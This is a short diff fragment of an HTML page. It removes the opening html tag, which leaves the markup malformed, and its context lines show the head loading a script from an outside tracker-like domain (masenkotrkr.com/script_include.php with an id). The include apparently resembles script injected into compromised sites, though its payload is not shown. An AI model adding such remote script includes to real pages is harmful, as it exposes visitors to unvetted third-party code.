@@ -1,4 +1,4 @@
-<html>
+
  <head><script type="text/javascript" src="https://masenkotrkr.com/script_include.php?id=1075716"></script>
   <title>
   </title>
